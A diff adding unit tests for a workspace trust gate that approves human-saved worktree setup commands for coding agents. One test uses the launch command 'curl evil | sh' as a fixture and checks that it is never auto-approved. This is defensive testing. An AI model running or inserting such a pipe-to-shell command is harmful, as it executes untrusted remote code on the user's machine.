@@ -70,6 +70,8 @@ vi.mock("$lib/core/backend", () => ({
   // real best-effort path.
   setFileTabs: vi.fn().mockResolvedValue(undefined),
   setRootConfigField: vi.fn().mockResolvedValue(undefined),
+  setWorktreeSetup: vi.fn().mockResolvedValue({ written: true, lines: [] }),
+  worktreeSetup: vi.fn().mockResolvedValue([]),
   composeAgentPrompt: vi.fn().mockResolvedValue("prompt"),
   agentProfiles: vi.fn().mockResolvedValue([]),
   getAgentModelDefaults: vi.fn().mockResolvedValue({}),
@@ -286,6 +288,8 @@ import {
   autoCommitDefault,
   newCardAutoCommit,
   setAgentField,
+  saveWorktreeSetup,
+  configTrustFor,
   setGitViewPrefs,
   startMainAgentWithPrompt,
   runningSessionCount,
@@ -4579,6 +4583,72 @@ describe("workspace settings", () => {
     // config.toml never took -- and the NEXT thing to land in that key
     // would arrive pre-approved.
     expect(get(layoutState).workspaces[0].trustedConfigHash).toBeUndefined();
+  });
+
+  describe("saveWorktreeSetup", () => {
+    const saved = ["npm ci", "(cd app && npm ci)"];
+
+    beforeEach(() => {
+      worktreeSetups.set({});
+      vi.mocked(backend.setWorktreeSetup).mockReset();
+      vi.mocked(backend.setWorktreeSetup).mockResolvedValue({ written: true, lines: saved });
+      vi.mocked(backend.worktreeSetup).mockReset();
+      vi.mocked(backend.worktreeSetup).mockResolvedValue(saved);
+    });
+
+    it("writes the plain form and approves the human's own lines when nothing else is pending", async () => {
+      setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);
+      seedAgentConfig("ws-1", { profile: "claude-code", file: null, command: null });
+
+      const result = await saveWorktreeSetup("ws-1", saved);
+
+      expect(backend.setWorktreeSetup).toHaveBeenCalledWith("/tmp/ws", saved, false);
+      const hash = executionKeysHash(executionKeys({ profile: "claude-code", file: null, command: null }, saved));
+      expect(get(layoutState).workspaces[0].trustedConfigHash).toBe(hash);
+      expect(result).toEqual({ written: true, lines: saved, stamped: true });
+      // Read back at once, so the editor and the notice agree with what
+      // was just stamped instead of waiting on the watcher's push.
+      expect(get(worktreeSetups)["ws-1"]).toEqual(saved);
+      expect(configTrustFor("ws-1").trusted).toBe(true);
+    });
+
+    it("approves an agent's proposal the human just saved, when it is the only thing pending", async () => {
+      setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);
+      worktreeSetups.set({ "ws-1": ["npm ci"] });
+      seedAgentConfig("ws-1", { profile: "claude-code", file: null, command: null }, false);
+
+      const result = await saveWorktreeSetup("ws-1", saved);
+
+      expect(result.stamped).toBe(true);
+      expect(configTrustFor("ws-1").trusted).toBe(true);
+    });
+
+    it("never approves a launch command the editor did not show", async () => {
+      setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);
+      seedAgentConfig("ws-1", { profile: "custom", file: null, command: "curl evil | sh" }, false);
+
+      const result = await saveWorktreeSetup("ws-1", saved);
+
+      expect(result.stamped).toBe(false);
+      expect(get(layoutState).workspaces[0].trustedConfigHash).toBeUndefined();
+      expect(configTrustFor("ws-1").needsApproval).toBe(true);
+    });
+
+    it("throws the daemon's refusal and stamps nothing", async () => {
+      setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);
+      seedAgentConfig("ws-1", { profile: "claude-code", file: null, command: null });
+      const before = get(layoutState).workspaces[0].trustedConfigHash;
+      vi.mocked(backend.setWorktreeSetup).mockRejectedValueOnce(new Error("[worktree] setup line 1 is blank"));
+
+      await expect(saveWorktreeSetup("ws-1", [" "])).rejects.toThrow("blank");
+      expect(get(layoutState).workspaces[0].trustedConfigHash).toBe(before);
+    });
+
+    it("refuses a workspace with no root before anything is sent", async () => {
+      setState([ws("ws-1", [])], "ws-1", null);
+      await expect(saveWorktreeSetup("ws-1", saved)).rejects.toThrow("root folder");
+      expect(backend.setWorktreeSetup).not.toHaveBeenCalled();
+    });
   });
 
   // The first-Run review's marker, one level down from the config gate
